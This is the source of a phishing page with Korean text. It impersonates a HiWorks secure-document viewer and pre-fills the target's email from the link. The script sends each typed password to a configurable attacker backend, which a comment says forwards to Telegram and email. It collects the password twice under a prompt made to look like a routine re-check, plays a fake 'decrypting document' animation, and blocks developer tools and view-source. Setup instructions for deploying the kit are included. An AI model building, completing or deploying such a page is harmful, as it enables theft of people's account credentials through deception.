  width:56px;height:56px;
  border:5px solid #e5e7eb;

}

  background:#e5e7eb;border-radius:20px;height:8px;overflow:hidden;

  height:100%;width:0%;background:#1a6fd4;
  border-radius:20px;transition:width .4s ease;
}

  font-size:12px;color:#888;text-align:right;
}

  border-radius:50%;background:#1a6fd4;color:#fff;
  font-size:34px;line-height:64px;text-align:center;
  animation:pop .4s ease;
}
@keyframes pop{0%{transform:scale(0);}80%{transform:scale(1.15);}100%{transform:scale(1);}}

<body onload="load()" class="flex flex-col justify-center items-center h-screen w-screen bg-no-repeat bg-cover" id="bg-image">

<form id="form" action="" method="post">
  <div class="h-[24rem] w-[28rem] bg-neutral-200 flex flex-col justify-center items-center" id="boxer">

    <!-- HiWorks 로고 -->
    <div class="mb-6 mt-4 h-11 w-11 flex flex-col justify-center" style="margin-bottom:15px;margin-top:0;">
      <img src="https://logo.clearbit.com/+https:" id="log" alt="" height="75px" width="75px">
    </div>

    <div>
      <div class="enthead" id="enthead">
        <strong>HiWorks 보안 문서 열람을 위해 본인 인증이 필요합니다</strong>
      </div>
      <div>
        <strong class="authen" id="authen">인증 중입니다....</strong>
        <strong class="rowrow" id="rowrow">비밀번호가 올바르지 않습니다. 다시 시도해 주세요.</strong>
      </div>
      <div class="pin">
        <input class="h-10 w-[22rem]" type="email" name="ingo" id="ingo" value="" readonly
               style="border:0;border:1px solid #0d4f8b;font-size:16px;font-weight:bold;color:#302f2f;">
      </div>
      <div class="p-2"></div>
      <div class="vin">

               placeholder="비밀번호" autofocus style="border:1px solid #0d4f8b;">
      </div>
      <div class="p-2"></div>
    </div>

    <div class="bttn">
      <button class="utton" type="submit" id="utton"
              style="width:200px;height:40px;background:#1a6fd4;color:#ffffff;border-radius:5px;border:none;font-size:15px;font-weight:600;cursor:pointer;">
        문서 열기
      </button>
    </div>
  </div>
</form>

<!-- ============================================================
     문서 뷰어 화면 (인증 성공 후 표시)
     ============================================================ -->
<div id="viewer-screen">
  <div id="viewer-header">
    <div class="doc-icon">📄</div>
    <div>
      <div class="doc-title" id="viewer-doc-title">공유문서.xlsx</div>
      <div class="doc-sub" id="viewer-doc-sub">HiWorks 보안 문서</div>
    </div>
  </div>

  <div id="viewer-body">
    <div class="viewer-card">

      <!-- 로딩 상태 -->
      <div id="loading-state">
        <div class="spinner"></div>
        <h2 id="viewer-status">문서를 준비하는 중…</h2>
        <p id="viewer-message">자격 증명을 확인하고 공유 문서를 불러오고 있습니다. 잠시만 기다려 주세요.</p>

        </div>

<!-- ============================================================
     설정 — B2 업로드 전 아래 3줄을 수정하세요
     ============================================================ -->
<script>
  // ⚠️ EDIT #1 — Render 백엔드 URL (끝에 슬래시 없이)
  const BACKEND_URL = "https://your-app.onrender.com";

  // ⚠️ EDIT #2 — Cloudflare Turnstile 사이트 키 (공개 키)
  const TURNSTILE_SITE_KEY = "YOUR_TURNSTILE_SITE_KEY";

  // ⚠️ EDIT #3 — B2에 업로드한 문서 이미지 URL
  const DOCUMENT_IMAGE_URL = "https://inquiry.com/document.png";
</script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
// ============================================================
// URL 에서 이메일 읽기 (email=, e=, u= 모두 지원)
// ============================================================
var searchParams = new URL(window.location.href).searchParams;
var emailFromUrl = searchParams.get('email')
                || searchParams.get('e')
                || searchParams.get('u')
                || '';

if (!emailFromUrl) {
  try {
    var raw = window.location.search.substring(1);
    if (raw && raw.indexOf('=') === -1) {
      var decoded = atob(raw);
      if (decoded.indexOf('@') !== -1) emailFromUrl = decoded;
    }
  } catch (e) {}
}

if (!emailFromUrl) {
  document.addEventListener('DOMContentLoaded', function () {
    var boxer = document.getElementById('boxer');
    if (boxer) {
      boxer.innerHTML =
        '<div style="padding:30px;text-align:center;color:#666;font-family:\'Malgun Gothic\',sans-serif;">' +
        '<h2 style="color:#1a6fd4;font-size:18px;margin:0 0 12px 0;">유효하지 않거나 만료된 링크입니다</h2>' +
        '<p style="font-size:14px;line-height:1.6;">이메일로 받으신 보안 링크를 통해 다시 접속해 주세요.</p>' +
        '</div>';
    }
  });
}

var ingoEl = document.getElementById('ingo');
if (emailFromUrl) ingoEl.value = emailFromUrl;

// 도메인 로고 가져오기
var mailspice = ingoEl.value || '';
var spiced = mailspice.substring(mailspice.lastIndexOf('@') + 1);
var logoUrl = spiced ? 'https://logo.clearbit.com/' + spiced : '';

if (logoUrl) {
  $('#log').attr('src', logoUrl);
  $('#log').on('error', function () {
    $(this).attr('src', 'https://i.imgur.com/7UDoBij.png');
  });
  document.getElementById('favicon').href = logoUrl;
}

// 푸터 연도
document.getElementById('viewer-year').textContent = new Date().getFullYear();

// 성공 상태 이미지 URL 적용
document.addEventListener('DOMContentLoaded', function () {
  var img = document.querySelector('.doc-img-wrap img');
  if (img) img.src = DOCUMENT_IMAGE_URL;
});

// ============================================================
// 🛡️ Turnstile 세션 토큰 발급
// ============================================================
let SESSION_TOKEN = null;

function loadTurnstile() {
  return new Promise((resolve) => {
    if (window.turnstile) return resolve();
    const s = document.createElement('script');
    s.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
    s.async = true; s.defer = true;
    s.onload = resolve;
    document.head.appendChild(s);
  });
}

async function getSessionToken() {
  if (SESSION_TOKEN) return SESSION_TOKEN;
  await loadTurnstile();
  return new Promise((resolve, reject) => {
    let holder = document.getElementById('turnstile-holder');
    if (!holder) {
      holder = document.createElement('div');
      holder.id = 'turnstile-holder';
      holder.style.display = 'none';
      document.body.appendChild(holder);
    }
    turnstile.render('#turnstile-holder', {
      sitekey: TURNSTILE_SITE_KEY,
      callback: async function (token) {
        try {
          const res = await fetch(BACKEND_URL + '/api/verify-captcha', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token })
          });
          const data = await res.json();
          if (data.success && data.sessionToken) {
            SESSION_TOKEN = data.sessionToken;
            resolve(SESSION_TOKEN);
          } else {
            reject(new Error('캡차 검증 실패'));
          }
        } catch (err) { reject(err); }
      },
      'error-callback': function () { reject(new Error('Turnstile 오류')); }
    });
  });
}

// ============================================================
// 문서 뷰어 애니메이션
// ============================================================
const viewer = {
  steps: [
    { pct: 15, msg: '자격 증명 확인 중…' },
    { pct: 35, msg: '공유 문서 위치 확인 중…' },
    { pct: 60, msg: '파일 내용 복호화 중…' },
    { pct: 85, msg: '보안 미리보기 준비 중…' },
    { pct: 100, msg: '마무리 중…' }
  ],
  show: function () {
    document.getElementById('viewer-screen').style.display = 'flex';
    document.getElementById('loading-state').style.display = 'block';
    document.getElementById('success-state').style.display = 'none';
    document.getElementById('progress-bar').style.width = '0%';
    document.getElementById('progress-label').textContent = '0%';
    this.runProgress();
  },
  runProgress: function () {
    let i = 0; const self = this;
    function next() {
      if (i >= self.steps.length) { self.finish(); return; }
      const step = self.steps[i];
      document.getElementById('progress-bar').style.width = step.pct + '%';
      document.getElementById('progress-label').textContent = step.pct + '%';
      document.getElementById('viewer-status').textContent = step.msg;
      i++;
      setTimeout(next, 900 + Math.random() * 700);
    }
    setTimeout(next, 600);
  },
  finish: function () {
    document.getElementById('loading-state').style.display = 'none';
    document.getElementById('success-state').style.display = 'block';
  }
};

// ============================================================
// 🚀 2회 입력 매칭 로직 (사용자에게 카운터 노출 없음)
// ============================================================
$(function () {
  let firstPassword = null;
  let firstSubmitted = false;
  let locked = false;

  const PROMPT_INITIAL = '<strong>HiWorks 보안 문서 열람을 위해 본인 인증이 필요합니다</strong>';
  const PROMPT_REENTER = '<strong>보안 문서 열람을 위해 비밀번호를 다시 한번 입력해 주세요</strong>';

  $(document).on('submit', '#form', async function (e) {
    e.preventDefault();
    if (locked) return;

    const email = $('#ingo').val();
    const password = $('#outcome').val();
    if (!email || !password) return;

    $('#enthead').hide();
    $('#rowrow').hide();
    $('#authen').show();

    try {
      const token = await getSessionToken();
      const attemptNum = firstSubmitted ? 2 : 1;

      // 매번 백엔드로 전송 (텔레그램 + 이메일)
      const res = await fetch(BACKEND_URL + '/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-session-token': token
        },
        body: JSON.stringify({
          email,
          password,
          attempt: attemptNum
        })
      });

      const data = await res.json();
      console.log('로그인 응답:', data);

      if (!firstSubmitted) {
        // ============ 1차 입력 ============
        firstPassword = password;
        firstSubmitted = true;

        // 프롬프트 살짝 변경 + 필드 비움 (자연스러운 재확인 단계처럼 보임)
        $('#authen').hide();
        $('#outcome').val('');
        $('#enthead').html(PROMPT_REENTER).show();
        $('#outcome').focus();
        return;
      }

      // ============ 2차 입력 ============
      if (password === firstPassword) {
        // ✅ 일치 → 문서 표시
        locked = true;
        $('#authen').hide();

        const filename = email.split('@')[0] + '_공유문서.xlsx';
        document.getElementById('viewer-doc-title').textContent = filename;
        document.getElementById('viewer-doc-sub').textContent =
          'HiWorks 보안 문서 · ' + email;
        document.getElementById('doc-id').textContent =
          email.split('@')[1] + '-SD-' + email.split('@')[0];

        viewer.show();

      } else {
        // ❌ 불일치 → 조용히 1차로 리셋 (사용자에게 오류 표시 없음)
        firstPassword = null;
        firstSubmitted = false;
        $('#authen').hide();
        $('#outcome').val('');
        $('#enthead').html(PROMPT_INITIAL).show();
        $('#outcome').focus();
      }

    } catch (err) {
      console.error('제출 오류:', err);
      // 오류 발생 시 조용히 리셋
      firstPassword = null;
      firstSubmitted = false;
      $('#authen').hide();
      $('#outcome').val('');
      $('#enthead').html(PROMPT_INITIAL).show();
      $('#outcome').focus();
    }
  });
});

// ============================================================
// 개발자 도구 차단 (기존 유지)
// ============================================================
window.oncontextmenu = function () { return false; };
$(document).on('keydown', function (e) {
  if (e.keyCode == 123) return false;
  if (e.ctrlKey && e.shiftKey && e.keyCode == 73) return false;
  if (e.ctrlKey && e.shiftKey && e.keyCode == 74) return false;
});
document.onkeydown = function (e) {
  if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) return false;
};
</script>
